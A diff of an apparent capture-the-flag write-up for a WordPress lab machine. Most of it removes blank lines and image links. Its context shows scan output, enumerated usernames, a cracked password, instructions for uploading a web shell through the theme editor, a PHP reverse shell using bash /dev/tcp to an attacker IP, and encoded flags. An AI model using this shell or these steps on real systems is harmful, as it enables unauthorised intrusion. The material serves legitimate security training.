@@ -16,7 +16,6 @@ _Thumbnail box image credits, designed by [Freepik](https://www.flaticon.com/au
 
 Answer the questions below
 
-
 ```
 ┌──(kali㉿kali)-[~]
 └─$ rustscan -a 10.10.95.155 --ulimit 5500 -b 65535 -- -A
@@ -211,7 +210,6 @@ Interesting Finding(s):
 [+] Memory used: 166.965 MB
 [+] Elapsed time: 00:00:22
 
-
 c0ldd, hugo, philip
 
 ┌──(kali㉿kali)-[~]
@@ -298,7 +296,6 @@ Interesting Finding(s):
 [+] Data Received: 1.027 KB
 [+] Memory used: 248.68 MB
 [+] Elapsed time: 00:00:09
-
 
 bruteforce
 
@@ -406,7 +403,6 @@ Interesting Finding(s):
 
 Scan Aborted: Canceled by User
 
-
 8 minutes
 
 c0ldd:9876543210
@@ -441,8 +437,6 @@ and search for length (948 Ok ) and (3863 wrong) (last 10 seconds to give the ri
 
 hugp and philip cannot found just use c0ldd to login
 
-
-
 webshell
 
 or can be using weevely https://www.kali.org/tools/weevely/
@@ -456,7 +450,6 @@ go to appearance -> editor then upload it and save.
 <?php
 exec("/bin/bash -c 'bash -i >& /dev/tcp/10.8.19.103/1337 0>&1'")
 ?>
-
 
 ┌──(kali㉿kali)-[~]
 └─$ rlwrap nc -lnvp 1337                                 
@@ -738,25 +731,16 @@ root
 
 ```
 
-![[Pasted image 20221226113605.png]]
-
-![[Pasted image 20221226121553.png]]
-![[Pasted image 20221226123208.png]]
-
-
-
 user.txt
 
 Provide the flag in its encoded format
 
 *RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ==*
 
-
 root.txt
 
 Provide the flag in its encoded format
 
 *wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE=*
-
 
 [[All in One]]
